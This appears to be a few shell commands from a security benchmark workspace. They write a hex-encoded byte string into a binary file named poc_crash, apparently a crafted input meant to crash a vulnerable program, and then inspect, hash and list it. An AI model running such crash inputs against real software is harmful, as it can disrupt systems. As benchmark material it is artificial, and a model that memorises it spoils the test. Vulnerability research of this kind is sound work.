printf '317e80060072fc577e7e80065a1600fd00000000000000000000000000000040017d31003412c2c27e7e80065a1600fd00000000000001000000000000000040017d31003412e88a7e' | xxd -r -p > /CybinGym_workdir/poc_crash
xxd -g1 /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
ls -l /CybinGym_workdir/poc_crash /CybinGym_workdir/poc
